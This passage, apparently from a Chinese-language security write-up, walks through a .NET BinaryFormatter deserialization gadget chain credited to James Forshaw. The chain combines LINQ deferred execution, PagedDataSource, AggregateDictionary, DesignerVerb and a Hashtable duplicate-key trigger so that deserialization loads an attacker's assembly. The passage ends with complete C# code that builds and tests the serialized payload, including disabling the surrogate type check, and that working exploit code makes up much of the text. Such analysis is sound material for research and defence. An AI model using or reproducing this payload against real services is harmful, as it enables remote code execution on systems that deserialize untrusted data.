    List data = new List();
    data.Add(File.ReadAllBytes(typeof(ExploitClass).Assembly.Location));
    var e1 = data.Select(Assembly.Load);
data 为一个IEnumerable类型，返回的集合e1 应为 IEnumerable 类型。
第二步：
我们希望select操作符的第二个参数所指示的委托函数是 _public virtual Type[] GetTypes()_
。这一步理想的委托函数应当Func，但是GetTypes() 函数没有输入参数，而且返回的是Type[]类型，怎么办？
我们可以通过反射API 来为实例方法创建一个开放委托。开放委托不仅不会存储对象实例，而且还会增加一个Assembly参数，这正是我们需要的。
    Func> map_type = (Func>)Delegate.CreateDelegate(typeof(Func>), typeof(Assembly).GetMethod("GetTypes"));
如果使用Selec操作符，我们希望的是一个返回Type对象的委托，但是GetTypes()
函数返回的是一个Ienumerable集合？还有其他的操作符可以选择吗？SelectMany 是一个好的选择:
     public static IEnumerable SelectMany(this IEnumerable source, Func> selector);
SelectMany 是一个好的选择，其委托类型为 Func> ，正符合GetTypes()。
    Func> map_type = (Func>)Delegate.CreateDelegate(typeof(Func>), typeof(Assembly).GetMethod("GetTypes"));
    var e2 = e1.SelectMany(map_type);
返回的集合e2 为 IEnumerable类型。
第三步：
与第一步类似，我们希望委托函数为： _public static object CreateInstance(Type type)_ ，那么查询语句如下：
    Type[] e2 = ...;
    var e3 = e2.Select(Activator.CreateInstance);
返回集合e3类型为 IEnumerable。
那么这条链的实现如下：
    List data = new List();
    data.Add(File.ReadAllBytes(typeof(ExploitClass).Assembly.Location));
    var e1 = data.Select(Assembly.Load);
    Func> map_type = (Func>)Delegate.CreateDelegate(typeof(Func>), typeof(Assembly).GetMethod("GetTypes"));
    var e2 = e1.SelectMany(map_type);
    var e3 = e2.Select(Activator.CreateInstance);
### 0x30 启动链
现在我们把
Assembly::Load(byte[])、Assembly.GetTypes()、Activator::CreateInstance(Type)
三个函数都写入了LINQ链里，根据LINQ的延迟执行特点，只有当我们枚举结果集合里的元素时，才会加载程序集并创建类型实例，执行我们的代码。那么问题来了，在反序列化后，如何保证执行枚举操作以启动这条链呢？
James Forshaw 想到的思路是这样的：首先找到一种方法，使得在反序列化时执行ToString() 函数，然后找到一条链从ToString() 到
IEnumerable。
#### 0x31 从ToString 到 IEnumerable
我们先来看是如何从ToString() 到 IEnumerable 的:
    IEnumerable -> PagedDataSource -> ICollection
    ICollection -> AggregateDictionary -> IDictionary
    IDictionary -> DesignerVerb -> ToString
代码实现如下：
    // PagedDataSource maps an arbitrary IEnumerable to an ICollection
    PagedDataSource pds = new PagedDataSource() { DataSource = e3 };
    // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
    // Class is internal so need to use reflection.
    IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);
    // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.
    DesignerVerb verb = new DesignerVerb("XYZ", null);
    // Need to insert IDictionary using reflection.
    typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);
第一步：
使用PagedDataSource类将IEnumerable 类型转换为 ICollection类型，看PagedDataSource 源码如下：
    public sealed class PagedDataSource : ICollection, ITypedList {
        private IEnumerable dataSource;
        private int currentPageIndex;
        private int pageSize;
        private bool allowPaging;
        private bool allowCustomPaging;
        private bool allowServerPaging;
        private int virtualCount;
        ...
    }
其中的dataSource字段为IEnumerable 类型。
第二步：
将 ICollection 类型转换为 IDictionary 类型
    internal class AggregateDictionary : IDictionary
    {
        private ICollection _dictionaries;
        public AggregateDictionary(ICollection dictionaries)
        { 
            _dictionaries = dictionaries;
        } // AggregateDictionary  
第三步：DesignerVerb 类型的ToString() 函数会枚举 IDictionary，看源码可以理解，如下：
    public string Text {
        get {
            object result = Properties["Text"];
            if (result == null) {
                return String.Empty;
            }
            return (string)result;
        }
    }
    public override string ToString() {
        return Text + " : " + base.ToString();
    }
我们将properties字段设置为dict，当读取Properties["Text"]就会触发后续的动作。
#### 0x32 触发ToString
我们需要找到一种方法在进行反序列化时触发ToString() 函数，进而启动整条链。James Forshaw 想到利用Hashtable。
在对Hashtable 类进行反序列化的时候，它将会重建密钥集。如果两个键相等，则反序列化将失败，并且Hashtable 会引发异常:
源码如下：
    // Hashtable.Insert()
    // The current bucket is in use
    // OR
    // it is available, but has had the collision bit set and we have already found an available bucket
    if (((buckets[bucketNumber].hash_coll & 0x7FFFFFFF) == hashcode) && 
        KeyEquals (buckets[bucketNumber].key, key)) {
        if (add) {
            throw new ArgumentException(Environment.GetResourceString("Argument_AddingDuplicate__", buckets[bucketNumber].key, key));
        }
    internal static String GetResourceString(String key, params Object[] values) {
        String s = GetResourceString(key);
        return String.Format(CultureInfo.CurrentCulture, s, values);
    }
可以看到，在GetResourceString 函数里，values 被传给了 String.Format()，由于values
不是string类型，会导致其调用ToSTring() 函数，进而启动整条链，加载自定义程序集并执行任意代码。
通过Hashtable 调用ToString 的代码如下:
    // Add two entries to table.
    ht.Add(verb, "Hello");
    ht.Add("Dummy", "Hello2");
    FieldInfo fi_keys = ht.GetType().GetField("buckets", BindingFlags.NonPublic | BindingFlags.Instance);
    Array keys = (Array)fi_keys.GetValue(ht);
    FieldInfo fi_key = keys.GetType().GetElementType().GetField("key", BindingFlags.Public | BindingFlags.Instance);
    for (int i = 0; i  Assembly.Load -> Assembly -> Assembly.GetType -> Type[] -> Activator.CreateInstance -> Win!
                List data = new List();
                // exp.dll 即为上面生成的程序集
                data.Add(File.ReadAllBytes(Path.Combine("./exp.dll")));
                var e1 = data.Select(Assembly.Load);
                Func> MyGetTypes = (Func>)Delegate.CreateDelegate(typeof(Func>), typeof(Assembly).GetMethod("GetTypes"));
                var e2 = e1.SelectMany(MyGetTypes);
                var e3 = e2.Select(Activator.CreateInstance);
                // PagedDataSource maps an arbitrary IEnumerable to an ICollection
                PagedDataSource pds = new PagedDataSource() { DataSource = e3 };
                // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
                // Class is internal so need to use reflection.
                IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);
                // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.
                DesignerVerb verb = new DesignerVerb("XYZ", null);
                // Need to insert IDictionary using reflection.
                typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);
                // Pre-load objects, this ensures they're fixed up before building the hash table.
                List ls = new List();
                ls.Add(e1);
                ls.Add(e2);
                ls.Add(e3);
                ls.Add(pds);
                ls.Add(verb);
                ls.Add(dict);
                Hashtable ht = new Hashtable();
                // Add two entries to table.
                ht.Add(verb, "Hello");
                ht.Add("Dummy", "Hello2");
                FieldInfo fi_keys = ht.GetType().GetField("buckets", BindingFlags.NonPublic | BindingFlags.Instance);
                Array keys = (Array)fi_keys.GetValue(ht);
                FieldInfo fi_key = keys.GetType().GetElementType().GetField("key", BindingFlags.Public | BindingFlags.Instance);
                for (int i = 0; i < keys.Length; ++i)
                {
                    object bucket = keys.GetValue(i);
                    object key = fi_key.GetValue(bucket);
                    if (key is string)
                    {
                        fi_key.SetValue(bucket, verb);
                        keys.SetValue(bucket, i);
                        break;
                    }
                }
                fi_keys.SetValue(ht, keys);
                ls.Add(ht);
                BinaryFormatter fmt1 = new BinaryFormatter();
                MemoryStream stm = new MemoryStream();
                fmt1.SurrogateSelector = new MySurrogateSelector();
                fmt1.Serialize(stm, ls);
                //info.AddValue("DataSet.Tables_0", stm.ToArray());
                /*
                BinaryFormatter fmt2 = new BinaryFormatter();
                stm.Seek(0, SeekOrigin.Begin);
                fmt2.Deserialize(stm);
                */
                return stm.ToArray();
            }
            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                System.Diagnostics.Trace.WriteLine("In GetObjectData");
                info.SetType(typeof(System.Windows.Forms.AxHost.State));
                info.AddValue("PropertyBagBinary", GadgetChains());
            }
        }
        class Program
        {
            static void Main(string[] args)
            {                               System.Configuration.ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");
                BinaryFormatter fmt1 = new BinaryFormatter();
                BinaryFormatter fmt2 = new BinaryFormatter();
                MemoryStream stm = new MemoryStream();
                PayloadClass test = new PayloadClass();
                fmt1.SurrogateSelector = new MySurrogateSelector();
                fmt1.Serialize(stm, test);
                stm.Seek(0, SeekOrigin.Begin);
                fmt2.Deserialize(stm);
            }
        }
    }